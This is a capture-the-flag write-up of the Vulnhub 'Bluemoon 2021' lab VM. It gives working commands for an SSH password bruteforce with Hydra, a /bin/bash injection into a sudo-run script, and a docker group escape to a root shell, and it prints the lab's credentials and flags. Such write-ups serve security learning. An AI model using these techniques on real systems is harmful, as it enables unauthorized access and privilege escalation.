# VA-W2-Bluemoon-Vulnhub Writeup

## Lab Information (From Vulnhub)
- (Machine) Name: Bluemoon 2021
- Author: Kirthik-
- OS: Linux/Debian

**Personal Note:** This apparently only works with VirtualBox; couldn't find the Bluemoon IP on VMWare or other VM software (struggled with that for a bit)

## Tools Used (In KaliLinux)
- Nmap, Dirb, Gobuster, Hydra, Docker

## 1. Recon Stage: Network Discovery
- The Attacker's Machine IP was identified with the command:
```bash
ifconfig
```
- Attacker IP: 192.168.56.102

- The Target's IP was found with a network scan using the command:
```bash
nmap -sn 192.168.56.0/24
```
- Target IP: 192.168.56.101 (Bluemoon IP)

## 2. Scanning Stage: Port Scanning
- A detailed nmap scan was performed with the command:
```bash 
nmap -sC -sV -p- 192.168.56.101
```
- The scan discovered three open ports: 21,22 and 80.
- Port 21 | Service: ftp | Version: vsftpd 3.0.3
- Port 22 | Service: ssh | Version: OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
- Port 80 | Service: http | Version: Apache httpd 2.4.38 ((Debian))

## 3. Gaining Access: Web Enumeration + FTP Enumeration + File Analysis
- The target IP was entered into the browser 192.168.56.101 where a page with the text **"-- Welcome -- Are You Ready To Play With Me .....!"** and a image with the text **"The Game Begins"**.

To find out any hidden files/directories gobuster was used with the command:
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```
- The result revealed a /hidden_text directory with a 200 OK Status
- Adding the directory to the target IP in the browser revealed a page with text displaying "Maintanance! Sorry For Delay. We Will Recover Soon" along with blue clickable text "Thank you..."
- Clicking on the "Thank you..." led to another page with a QR code that after analysis provided the logins:
```USER: userftp```
```PASSWORD: ftpp@assword```

### FTP Enumeration
- FTP access was made with:
```bash
ftp 192.168.56.101
```
- Where the login credentials were used to successfully enter the FTP session
- ```ls``` was used to check the file system that revealed two files:
  - information.txt
  - p_lists.txt
- ```exit``` was used to close the FTP session

### File Analysis
- ```cat``` was used to display information in both files
- information.txt
  - A text file greeting the user "Robin" and informing them of their password "weekness" and their request
  to choose a password from p_lists.txt
- p_lists.txt
  - A text file with numerous passwords

### SSH Bruteforce
- Knowing the username "Robin" Hydra was used to obtain the password through bruteforcing through the p_lists.txt
```hydra -l robin -P p_lists.txt ssh://192.168.56.101```
- The resulting password was successfully found: k4rv3ndh4nh4ck3r

## 4. Escalating Privileges: From Robin to Jerry
- An SSH connection was made with ```ssh robin@192.168.56.105``` where a login was made with the password obtained above for 'robin'
- ```ls``` revealed a text file "user1.txt" with the contents:
  - ```Fl4g{u5er1r34ch3d5ucc355fully}```
- Checking for the users privileges with the command ```sudo -l``` revealed that robin can run the script /home/robin/project/feedback.sh as the user jerry without a password
- Running the command ```sudo -u jerry /home/robin/project/feedback.sh``` allowed us to enter a name (I entered johndoe) along with
a ```/bin/bash``` injection into subsequent prompt asking for 'feedback about this target machine'
- ```whoami``` was used to confirm the user was ```jerry```
- Lastly, to upgrade the shell ```python3 -c 'import pty; pty.spawn("/bin/bash")'``` was used

### Jerry To Root
- ```cd``` was used to change the directory from robin > home > jerry along with ```ls``` to view available files/directories where a user2.txt file was found and read with ```cat```
  - The contents displayed the flag: Fl4g{Y0ur34ch3du53r25uc355ful1y} along with text prompting the finder (me) to try to find the root
- Next the ``id`` command was used that revealed that ```jerry``` was a member of the ```docker``` group with the id 114
- To exploit docker and escalate privileges further the command ```docker run -v /:/mnt --rm -it alpine chroot /mnt sh``` was used which allowed us root shell on the host machine
- Finally, we changed the directory to root with ```cd /root``` and used ``ls`` to view files/directories that revealed the a ```root.txt``` file
- Running ```cat root.txt``` revealed the final flag:
  - Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}




















